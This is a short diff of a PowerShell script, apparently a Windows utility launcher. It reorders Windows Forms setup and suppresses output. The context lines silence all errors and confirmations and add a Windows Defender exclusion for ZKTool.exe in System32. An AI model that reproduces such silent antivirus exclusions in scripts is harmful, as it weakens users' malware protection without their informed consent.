@@ -1,5 +1,4 @@
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.Application]::EnableVisualStyles()
+
 
 $ErrorActionPreference = 'SilentlyContinue'
 $ConfirmPreference = 'None'
@@ -12,8 +11,13 @@ If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 
 # Run Script In Powershell Core
 if ($PSEdition -eq "Desktop") {
-    pwsh.exe 
+    pwsh.exe | Out-Null
 }
+
+Add-Type -AssemblyName System.Windows.Forms
+[System.Windows.Forms.Application]::EnableVisualStyles()
+$ErrorActionPreference = 'SilentlyContinue'
+$ConfirmPreference = 'None'
 
 if (!(Get-MpPreference | Select-Object -ExpandProperty ExclusionPath) -eq "C:\Windows\System32\ZKTool.exe") {
     Add-MpPreference -ExclusionPath "$env:windir\System32\ZKTool.exe"
